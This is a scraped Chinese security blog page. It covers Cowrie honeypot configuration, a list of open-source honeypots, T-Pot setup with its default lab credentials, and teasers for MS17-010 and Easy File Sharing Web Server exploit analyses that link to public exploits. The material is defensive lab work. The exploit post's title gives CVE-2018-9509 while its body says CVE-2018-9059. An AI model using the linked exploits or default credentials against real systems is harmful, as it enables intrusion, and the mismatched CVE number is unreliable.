rel="noopener">anonymous@sensors.carnivore.it</a><br>#password = anonymous<br>#muc = dionaea.sensors.carnivore.it<br>#signal_createsession = cowrie-events<br>#signal_connectionlost = cowrie-events<br>#signal_loginfailed = cowrie-events<br>#signal_loginsucceeded = cowrie-events<br>#signal_command = cowrie-events<br>#signal_clientversion = cowrie-events<br>#debug=true<br><br><br><br><br># ============================================================================<br># Output Plugins<br># These provide an extensible mechanism to send audit log entries to third<br># parties. The audit entries contain information on clients connecting to<br># the honeypot.<br>#<br># Output entries need to start with ‘output_’ and have the ‘enabled’ entry.<br># ============================================================================<br><br>#[output_xmpp]<br>#enabled=true<br>#server = conference.cowrie.local<br>#user = <a href="mailto:cowrie@cowrie.local" target="_blank" rel="noopener">cowrie@cowrie.local</a><br>#password = cowrie<br>#muc = hacker_room<br><br># JSON based logging module<br>#<br>[output_jsonlog]<br>enabled = true<br>logfile = ${honeypot:log_path}/cowrie.json<br>epoch_timestamp = false<br><br># Supports logging to Elasticsearch<br># This is a simple early release<br>#<br>#[output_elasticsearch]<br>#enabled = false<br>#host = localhost<br>#port = 9200<br>#index = cowrie<br>#type = cowrie<br>#pipeline = geoip<br><br><br># Send login attemp information to SANS DShield<br># See <a href="https://isc.sans.edu/ssh.html" target="_blank" rel="noopener">https://isc.sans.edu/ssh.html</a><br># You must signup for an api key.<br># Once registered, find your details at: <a href="https://isc.sans.edu/myaccount.html" target="_blank" rel="noopener">https://isc.sans.edu/myaccount.html</a><br>#<br>#[output_dshield]<br>#userid = userid_here<br>#auth_key = auth_key_here<br>#batch_size = 100<br>#enabled = false<br><br><br># Local Syslog output module<br>#<br># This sends log messages to the local syslog daemon.<br># Facility can be:<br># KERN, USER, MAIL, DAEMON, AUTH, LPR, NEWS, UUCP, CRON, SYSLOG and LOCAL0 to LOCAL7.<br>#<br># Format can be:<br># text, cef<br>#<br>#[output_localsyslog]<br>#enabled = false<br>#facility = USER<br>#format = text<br><br><br># Text output<br># This writes audit log entries to a text file<br>#<br># Format can be:<br># text, cef<br>#<br>#[output_textlog]<br>#enabled = false<br>#logfile = ${honeypot:log_path}/audit.log<br>#format = text<br><br><br># MySQL logging module<br># Database structure for this module is supplied in docs/sql/mysql.sql<br>#<br># MySQL logging requires extra software: sudo apt-get install libmysqlclient-dev<br># MySQL logging requires an extra Python module: pip install mysql-python<br>#<br>#[output_mysql]<br>#enabled = false<br>#host = localhost<br>#database = cowrie<br>#username = cowrie<br>#password = secret<br>#port = 3306<br>#debug = false<br><br># Rethinkdb output module<br># Rethinkdb output module requires extra Python module: pip install rethinkdb<br><br>#[output_rethinkdblog]<br>#enabled = false<br>#host = 127.0.0.1<br>#port = 28015<br>#table = output<br>#password =<br>#db = cowrie<br><br># SQLite3 logging module<br>#<br># Logging to SQLite3 database. To init the database, use the script<br># docs/sql/sqlite3.sql:<br>#     sqlite3 &lt;db_file&gt; &lt; docs/sql/sqlite3.sql<br>#<br>#[output_sqlite]<br>#enabled = false<br>#db_file = cowrie.db<br><br># MongoDB logging module<br>#<br># MongoDB logging requires an extra Python module: pip install pymongo<br>#<br>#[output_mongodb]<br>#enabled = false<br>#connection_string = mongodb://username:password@host:port/database<br>#database = dbname<br><br><br># Splunk HTTP Event Collector (HEC) output module<br># sends JSON directly to Splunk over HTTP or HTTPS<br># Use ‘https’ if your HEC is encrypted, else ‘http’<br># mandatory fields: url, token<br># optional fields: index, source, sourcetype, host<br>#<br>#[output_splunk]<br>#enabled = false<br>#url = <a href="https://localhost:8088/services/collector/event" target="_blank" rel="noopener">https://localhost:8088/services/collector/event</a><br>#token = 6A0EA6C6-8006-4E39-FC44-C35FF6E561A8<br>#index = cowrie<br>#sourcetype = cowrie<br>#source = cowrie<br><br><br># HPFeeds<br>#<br>#[output_hpfeeds]<br>#enabled = false<br>#server = hpfeeds.mysite.org<br>#port = 10000<br>#identifier = abc123<br>#secret = secret<br>#debug=false<br><br><br># VirusTotal output module<br># You must signup for an api key.<br>#<br>#[output_virustotal]<br>#enabled = false<br>#api_key = 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef<br>#upload = True<br>#debug = False<br>#scan_file = True<br>#scan_url = False<br><br><br># Cuckoo output module<br>#[output_cuckoo]<br>#enabled = false<br># no slash at the end<br>#url_base = <a href="http://127.0.0.1:8090" target="_blank" rel="noopener">http://127.0.0.1:8090</a><br>#user = user<br>#passwd = passwd<br># force will upload duplicated files to cuckoo<br>#force = 0<br><br># upload to MalShare<br>#[output_malshare]<br>#enabled = false<br><br># This will produce a <em>lot</em> of messages - you have been warned….<br>#[output_slack]<br>#enabled = false<br>#channel = channel_that_events_should_be_posted_in<br>#token = slack_token_for_your_bot<br>#debug = false<br><br><br># <a href="https://csirtg.io" target="_blank" rel="noopener">https://csirtg.io</a><br># You must signup for an api key.<br>#<br>#[output_csirtg]<br>#enabled = false<br>#username = wes<br>#feed = scanners<br>#description = random scanning activity<br>#token = 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef<br><br><br>#[output_socketlog]<br>#enabled = false<br>#address = 127.0.0.1:9000<br>#timeout = 5<br><br># Upload files that cowrie has captured to an S3 (or compatible bucket)<br># Files are stored with a name that is the SHA of their contents<br>#<br>#[output_s3]<br>#<br># The AWS credentials to use.<br># Leave these blank to use botocore’s credential discovery e.g .aws/config or ENV variables.<br># As per <a href="https://github.com/boto/botocore/blob/develop/botocore/credentials.py#L50-L65" target="_blank" rel="noopener">https://github.com/boto/botocore/blob/develop/botocore/credentials.py#L50-L65</a><br>#access_key_id = AKIDEXAMPLE<br>#secret_access_key = wJalrXUtnFEMI/K7MDENG+bPxRfiCYEXAMPLEKEY<br>#<br># The bucket to store the files in. The bucket must already exist.<br>#bucket = my-cowrie-bucket<br>#<br># The region the bucket is in<br>#region = eu-west-1<br>#<br># An alternate endpoint URL. If you self host a pithos instance you can set<br># this to its URL (e.g. <a href="https://s3.mydomain.com" target="_blank" rel="noopener">https://s3.mydomain.com</a>) - can otherwise be blank<br>#endpoint =<br>#<br># Whether or not to validate the S3 certificate. Set this to ‘no’ to turn this<br># off. Do not do this for real AWS. It’s only needed for self-hosted S3 clone<br># where you don’t yet have real certificates.<br>#verify = no<br><br>#[output_influx]<br>#enabled = false<br>#host = 127.0.0.1<br>#port = 8086<br>#database_name = cowrie<br>#retention_policy_duration = 12w<br><br>[output_kafka]<br>enabled = false<br>host = 127.0.0.1<br>port = 9092<br>topic = cowrie<br><br><br>#[output_redis]<br>#enabled = false<br>#host = 127.0.0.1<br>#port = 6379<br># DB of the redis server. Defaults to 0<br>#db = 0<br># Password of the redis server. Defaults to None<br>#password = secret<br># Name of the list to push to or the channel to publish to. Required<br>#keyname = cowrie<br># Method to use when sending data to redis.<br># Can be one of [lpush, rpush, publish]. Defaults to lpush<br>#send_method = lpush<br><br><br># Perform Reverse DNS lookup<br>#[output_reversedns]<br>#enabled = true<br># Timeout in seconds<br>#timeout = 3<br><br>#[output_greynoise]<br>#enabled = true<br>#debug=False<br># Name of the tags separated by comma, for which the IP has to be scanned for.<br># Example “SHODAN,JBOSS_WORM,CPANEL_SCANNER_LOW”<br># If there isn’t any specific tag then just leave it “all”<br>#tags = all<br># It’s optional to have API key, so if you don’t want to but<br># API key then leave this option commented<br>#api_key = 1234567890<br></tunnel></tunnel></portnumber></maxcache></max></min></details>



<p>实际配置vi /data/cowrie/cowrie-git/etc/cowrie.cfg </p>
<p>`[honeypot]<br>hostname = ubuntu<br>log_path = log<br>download_path = dl<br>report_public_ip = true<br>share_path= share/cowrie<br>state_path = /tmp/cowrie/data<br>etc_path = etc<br>contents_path = honeyfs<br>txtcmds_path = txtcmds<br>ttylog = true<br>ttylog_path = log/tty<br>interactive_timeout = 180<br>authentication_timeout = 120<br>backend = shell<br>auth_class = AuthRandom<br>auth_class_parameters = 2, 5, 10<br>reported_ssh_port = 2222<br>data_path = /tmp/cowrie/data</p>
<p>[shell]<br>filesystem = share/cowrie/fs.pickle<br>processes = share/cowrie/cmdoutput.json<br>arch = linux-x64-lsb<br>kernel_version = 3.2.0-4-amd64<br>kernel_build_string = #1 SMP Debian 3.2.68-1+deb7u1<br>hardware_platform = x86_64<br>operating_system = GNU/Linux</p>
<p>[ssh]<br>enabled = true<br>rsa_public_key = etc/ssh_host_rsa_key.pub<br>rsa_private_key = etc/ssh_host_rsa_key<br>dsa_public_key = etc/ssh_host_dsa_key.pub<br>dsa_private_key = etc/ssh_host_dsa_key<br>version = SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2<br>listen_endpoints = tcp:2222:interface=0.0.0.0<br>sftp_enabled = true<br>forwarding = true<br>forward_redirect = false<br>forward_tunnel = false</p>
<p>[telnet]<br>enabled = true<br>listen_endpoints = tcp:2223:interface=0.0.0.0<br>reported_port = 2223</p>
<p>[output_jsonlog]<br>enabled = true<br>logfile = /cowrie/cowrie-git/var/log/cowrie/cowrie.json<br>epoch_timestamp = false`</p>
<p>生成密钥对，复制到etc下，修改名字，与cowrie.cfg 对应</p>
<p>ssh-keygen -t dsa<br>ssh-keygen -t rsa </p>
<p>docker-compose up</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/22/企业安全建设/蜜罐/蜜罐汇总/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="xxx">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="My blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/04/22/企业安全建设/蜜罐/蜜罐汇总/" class="post-title-link" itemprop="url">蜜罐汇总</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-04-22 11:00:25" itemprop="dateCreated datePublished" datetime="2019-04-22T11:00:25+08:00">2019-04-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-02-15 20:09:13" itemprop="dateModified" datetime="2021-02-15T20:09:13+08:00">2021-02-15</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/企业安全建设/" itemprop="url" rel="index"><span itemprop="name">企业安全建设</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/企业安全建设/蜜罐/" itemprop="url" rel="index"><span itemprop="name">蜜罐</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="为什么需要蜜罐"><a href="#为什么需要蜜罐" class="headerlink" title="为什么需要蜜罐"></a>为什么需要蜜罐</h1><p>蜜罐的主要作用是能够诱导和记录网络攻击行为，组织或者延缓对真正目标的攻击，而且能对攻击行为进行捕获和分析，了解攻击方所使用的工具与方法，推测攻击意图和动机，能够让防御方清晰地了解他们所面对的安全威胁，并通过技术和管理手段来增强实际系统的安全防护能力。</p>
<h1 id="蜜罐汇总"><a href="#蜜罐汇总" class="headerlink" title="蜜罐汇总"></a>蜜罐汇总</h1><p>web服务蜜罐<a href="https://github.com/mushorg/glastopf" target="_blank" rel="noopener">https://github.com/mushorg/glastopf</a><br>web服务蜜罐<a href="https://www.anomali.com/blog/shockpot" target="_blank" rel="noopener">https://www.anomali.com/blog/shockpot</a><br>ssh服务蜜罐<a href="https://github.com/desaster/kippo" target="_blank" rel="noopener">https://github.com/desaster/kippo</a><br>elasticsearch服务蜜罐<a href="https://github.com/jordan-wright/elastichoney" target="_blank" rel="noopener">https://github.com/jordan-wright/elastichoney</a><br>rdp服务蜜罐rdpy-rdphoneypot<br>主动欺骗型蜜罐<a href="https://github.com/honeynet/beeswarm" target="_blank" rel="noopener">https://github.com/honeynet/beeswarm</a><br>ICS/SCADA蜜罐<a href="http://conpot.org" target="_blank" rel="noopener">http://conpot.org</a><br>amun蜜罐<a href="https://sourceforge.net/projects/amunhonet" target="_blank" rel="noopener">https://sourceforge.net/projects/amunhonet</a><br>dionaea蜜罐<a href="http://edgis-security.org/honeypot/dionaea" target="_blank" rel="noopener">http://edgis-security.org/honeypot/dionaea</a><br>wordpress蜜罐<a href="https://github.com/gbrindisi/wordpot" target="_blank" rel="noopener">https://github.com/gbrindisi/wordpot</a></p>
<h2 id="高交互蜜罐emobility"><a href="#高交互蜜罐emobility" class="headerlink" title="高交互蜜罐emobility"></a>高交互蜜罐emobility</h2><p>udp/tcp服务蜜罐honeytrap<br>工控蜜罐conpot<br>ssh服务蜜罐（基于kippo改进）cowire<br>tanner+snare高级web服务蜜罐（可以复制已有网站）<br>medpot<br>mailhoney SMTP蜜罐<a href="https://github.com/awhitehatter/mailoney" target="_blank" rel="noopener">https://github.com/awhitehatter/mailoney</a><br>honeypy <a href="https://github.com/foospidy/HoneyPy" target="_blank" rel="noopener">https://github.com/foospidy/HoneyPy</a><br>heralding 登录认证蜜罐<a href="https://github.com/johnnykv/heralding" target="_blank" rel="noopener">https://github.com/johnnykv/heralding</a><br>glutton <a href="https://github.com/mushorg/glutton" target="_blank" rel="noopener">https://github.com/mushorg/glutton</a><br>ciscoasa  CVE-2018-0101蜜罐 <a href="https://github.com/Cymmetria/ciscoasa_honeypot" target="_blank" rel="noopener">https://github.com/Cymmetria/ciscoasa_honeypot</a><br>adbhoney  Android Debug蜜罐 <a href="https://github.com/huuck/ADBHoney" target="_blank" rel="noopener">https://github.com/huuck/ADBHoney</a><br>mongodb蜜罐 <a href="https://github.com/Plazmaz/MongoDB-HoneyProxy" target="_blank" rel="noopener">https://github.com/Plazmaz/MongoDB-HoneyProxy</a><br>iot tr-069蜜罐 <a href="https://github.com/omererdem/honeything" target="_blank" rel="noopener">https://github.com/omererdem/honeything</a><br>iot <a href="https://github.com/darkarnium/kako" target="_blank" rel="noopener">https://github.com/darkarnium/kako</a></p>
<h2 id="蜜罐平台"><a href="#蜜罐平台" class="headerlink" title="蜜罐平台"></a>蜜罐平台</h2><p>蜜罐列表<a href="https://github.com/paralax/awesome-honeypots" target="_blank" rel="noopener">https://github.com/paralax/awesome-honeypots</a><br>mhn自建蜜罐系统<a href="https://github.com/threatstream/mhn" target="_blank" rel="noopener">https://github.com/threatstream/mhn</a><br>t-pot自建蜜罐系<a href="https://dtag-dev-sec.github.io" target="_blank" rel="noopener">https://dtag-dev-sec.github.io</a><br><a href="http://www.honeynet.org" target="_blank" rel="noopener">www.honeynet.org</a></p>
<p>使用t-pot.iso创建虚拟机<br>默认用户名tsec 密码tsec<br>sudo su<br>git clone <a href="https://github.com/dtag-dev-sec/tpotce" target="_blank" rel="noopener">https://github.com/dtag-dev-sec/tpotce</a><br>cd tpotce/iso/installer/<br>./install.sh –type=user</p>
<p>kibana <a href="https://192.168.6.134:64297" target="_blank" rel="noopener">https://192.168.6.134:64297</a><br>web管理 <a href="https://192.168.6.134:64294" target="_blank" rel="noopener">https://192.168.6.134:64294</a><br>ssh ssh <a href="mailto:tsec@192.168.6.134" target="_blank" rel="noopener">tsec@192.168.6.134</a> 64295</p>
<p>检验<br>rdpmstsc 192.168.<br>6.134    只能出现登录页面，无法尝试登录<br>cowrie </p>
<table>
<thead>
<tr>
<th>蜜罐名</th>
<th>访问方式</th>
<th>结果</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>cowrie</td>
<td>mstsc</td>
<td>只能出现登录页面，无法尝试登录</td>
<td></td>
</tr>
<tr>
<td>rdpy</td>
<td>ssh</td>
<td>账号root密码admin，能记录命令</td>
<td>可以看看因特网上的使用的密码字典</td>
</tr>
<tr>
<td>nionaea</td>
<td>27017</td>
<td>部分功能</td>
<td>建议试试mongodb</td>
</tr>
<tr>
<td>P0F</td>
<td>type:”P0F”</td>
<td>识别攻击源指纹</td>
<td></td>
</tr>
<tr>
<td>elasticpot</td>
<td>curl “<a href="http://192.168.6.134:9200&quot;" target="_blank" rel="noopener">http://192.168.6.134:9200&quot;</a></td>
<td>可以拿到信息</td>
<td>可以用来发现攻击者的目的</td>
</tr>
</tbody>
</table>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/22/企业安全建设/蜜罐/rdp蜜罐/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="xxx">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="My blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/04/22/企业安全建设/蜜罐/rdp蜜罐/" class="post-title-link" itemprop="url">rdp蜜罐-rdpy</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-04-22 11:00:25" itemprop="dateCreated datePublished" datetime="2019-04-22T11:00:25+08:00">2019-04-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-02-15 20:03:20" itemprop="dateModified" datetime="2021-02-15T20:03:20+08:00">2021-02-15</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/企业安全建设/" itemprop="url" rel="index"><span itemprop="name">企业安全建设</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/企业安全建设/蜜罐/" itemprop="url" rel="index"><span itemprop="name">蜜罐</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>pip install rdpy</p>
<p>报错 No module named PyQt4<br>ln -s /usr/lib/python2.7/dist-packages/PyQt4/</p>
<p>sudo apt-get install python-qt4 -y</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/08/CVE漏洞分析/ms17-010/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="xxx">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="My blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/04/08/CVE漏洞分析/ms17-010/" class="post-title-link" itemprop="url">ms17-010漏洞分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-04-08 00:13:21" itemprop="dateCreated datePublished" datetime="2019-04-08T00:13:21+08:00">2019-04-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-03-14 22:45:13" itemprop="dateModified" datetime="2021-03-14T22:45:13+08:00">2021-03-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CVE漏洞分析/" itemprop="url" rel="index"><span itemprop="name">CVE漏洞分析</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>分析ms17-010的文章很多，但都是点到为止，并没有深入分析，网上能找到最详细的分析文章我认为是国外的安全研究员写的<a href="https://github.com/worawit/MS17-010/blob/master/BUG.txt" target="_blank" rel="noopener">https://github.com/worawit/MS17-010/blob/master/BUG.txt
</a><br><a href="http://www.freebuf.com/articles/system/139481.html" target="_blank" rel="noopener">国内研究员翻译</a><br>该文章写的非常详细，这里写下自己理解到的漏洞利用原理。<br>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2019/04/08/CVE漏洞分析/ms17-010/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </p></div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/08/CVE漏洞分析/CVE-2018-9509/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="xxx">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="My blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/04/08/CVE漏洞分析/CVE-2018-9509/" class="post-title-link" itemprop="url">Easy File Sharing Web Server 7.2 - Stack Buffer Overflow(CVE-2018-9509)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2019-04-08 00:13:21 / 修改时间：01:06:31" itemprop="dateCreated datePublished" datetime="2019-04-08T00:13:21+08:00">2019-04-08</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CVE漏洞分析/" itemprop="url" rel="index"><span itemprop="name">CVE漏洞分析</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>漏洞介绍<br> Date: 03/24/2018<br> Exploit Author: rebeyond - <a href="http://www.rebeyond.net" target="_blank" rel="noopener">http://www.rebeyond.net</a><br> Vendor Homepage: <a href="http://www.sharing-file.com/" target="_blank" rel="noopener">http://www.sharing-file.com/</a><br> Software Link: <a href="http://www.sharing-file.com/efssetup.exe" target="_blank" rel="noopener">http://www.sharing-file.com/efssetup.exe</a><br> Version: 7.2<br> CVE: CVE-2018-9059<br> POC：<a href="https://www.exploit-db.com/exploits/44485/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44485/</a><br> Tested on: Windows 7 home 32</p>
<p>从exploit-db拿来简单的栈溢出漏洞分析一下<br>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2019/04/08/CVE漏洞分析/CVE-2018-9509/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </p></div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/07/企业安全建设/网络拓扑模拟/eve-ng/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="xxx">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="My blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/04/07/企业安全建设/网络拓扑模拟/eve-ng/" class="post-title-link" itemprop="url">eve-ng</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-04-07 23:13:21" itemprop="dateCreated datePublished" datetime="2019-04-07T23:13:21+08:00">2019-04-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-02-14 16:48:38" itemprop="dateModified" datetime="2021-02-14T16:48:38+08:00">2021-02-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/企业安全建设/" itemprop="url" rel="index"><span itemprop="name">企业安全建设</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/企业安全建设/网络拓扑模拟/" itemprop="url" rel="index"><span itemprop="name">网络拓扑模拟</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><p>在学习企业安全建设的时候，大部分情况下我们是没有办法直接接触到一个企业正式的网络环境的，在学习的时候只能零碎的接触到企业里会实际用到的防御手段。但是无法全面的理解一个企业应该如何搭建自己的纵深防御系统。</p>
<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>eve-ng(Emulated Virtual Environment - NextGeneration)原名是UnifiedNetworking Lab统一网络实验室。这款模拟器已经不仅可以模拟网络设备，也可以运行一切虚拟机。理论上这款软件上我们可以模拟大部分网络环境。<br>因此我试着利用eve-ng模拟一个企业的网络安全拓扑，并部署一些开源的安全项目来模拟攻防,可能用到的安全项目如下：</p>
<ul>
<li>网络入侵检测suricata<br><a href="https://suricata-ids.org/" target="_blank" rel="noopener">https://suricata-ids.org/</a></li>
<li>防火墙pfsense<br><a href="https://github.com/pfsense" target="_blank" rel="noopener">https://github.com/pfsense</a></li>
<li>主机入侵检测wazuh<br><a href="https://wazuh.com/" target="_blank" rel="noopener">https://wazuh.com/</a></li>
<li>蜜罐hfish,tpot<br><a href="https://github.com/hacklcx/HFish" target="_blank" rel="noopener">https://github.com/hacklcx/HFish</a><br><a href="https://github.com/telekom-security/tpotce#createiso" target="_blank" rel="noopener">https://github.com/telekom-security/tpotce#createiso</a></li>
<li>漏扫xunfeng<br><a href="https://github.com/ysrc/xunfeng" target="_blank" rel="noopener">https://github.com/ysrc/xunfeng</a></li>
<li>堡垒机jumpserver<br><a href="https://github.com/jumpserver" target="_blank" rel="noopener">https://github.com/jumpserver</a></li>
<li>集中管理平台freeipa<br><a href="https://www.freeipa.org/page/Main_Page" target="_blank" rel="noopener">https://www.freeipa.org/page/Main_Page</a></li>
<li>安全运维平台ossim<br><a href="https://cybersecurity.att.com/products/ossim" target="_blank" rel="noopener">https://cybersecurity.att.com/products/ossim</a></li>
<li>威胁情报OTX<br><a href="https://otx.alienvault.com/" target="_blank" rel="noopener">https://otx.alienvault.com/</a><br><a href="https://www.misp-project.org/" target="_blank" rel="noopener">https://www.misp-project.org/</a></li>
<li>web应用防护<br><a href="https://www.modsecurity.org/" target="_blank" rel="noopener">https://www.modsecurity.org/</a></li>
</ul>
<h1 id="eve-ng-基本配置"><a href="#eve-ng-基本配置" class="headerlink" title="eve-ng 基本配置"></a>eve-ng 基本配置</h1><h2 id="eve-ng添加自定义镜像"><a href="#eve-ng添加自定义镜像" class="headerlink" title="eve-ng添加自定义镜像"></a>eve-ng添加自定义镜像</h2><h3 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h3><p><a href="https://zhuanlan.zhihu.com/p/82005651" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/82005651</a></p>
<h2 id="eve-ng拓展硬盘"><a href="#eve-ng拓展硬盘" class="headerlink" title="eve-ng拓展硬盘"></a>eve-ng拓展硬盘</h2><h3 id="refer-1"><a href="#refer-1" class="headerlink" title="refer"></a>refer</h3><p><a href="https://www.eve-ng.net/index.php/documentation/howtos-video/expand-hdd-on-eve-vm/" target="_blank" rel="noopener">https://www.eve-ng.net/index.php/documentation/howtos-video/expand-hdd-on-eve-vm/</a></p>
<h2 id="eve-ng-自定义操作系统image"><a href="#eve-ng-自定义操作系统image" class="headerlink" title="eve-ng 自定义操作系统image"></a>eve-ng 自定义操作系统image</h2><h3 id="refer-2"><a href="#refer-2" class="headerlink" title="refer"></a>refer</h3><p><a href="https://www.eve-ng.net/index.php/documentation/howtos/howto-create-own-linux-host-image/" target="_blank" rel="noopener">https://www.eve-ng.net/index.php/documentation/howtos/howto-create-own-linux-host-image/</a></p>
<h1 id="pfsense镜像搭建"><a href="#pfsense镜像搭建" class="headerlink" title="pfsense镜像搭建"></a>pfsense镜像搭建</h1><ol>
